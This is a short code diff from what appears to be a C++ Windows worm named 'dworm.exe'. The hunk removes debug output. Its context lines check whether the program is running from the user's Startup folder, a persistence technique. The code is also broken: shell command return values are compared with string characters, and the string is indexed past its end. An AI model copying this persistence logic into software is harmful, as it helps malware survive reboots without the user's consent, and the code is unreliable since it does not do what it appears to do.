@@ -132,9 +132,6 @@ int main(int argc, char* argv[]) {
 		const int arg = system("echo %cd%");
 		string dir = _fullpath(basePath, argv[0], sizeof(basePath));
 
-		cout << startupdir2 << endl;
-		cout << dir << endl;
-		system("pause");
 
 		if (dir[dir.size()] == system("echo C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\dworm.exe")) {
 			Sleep(1000);
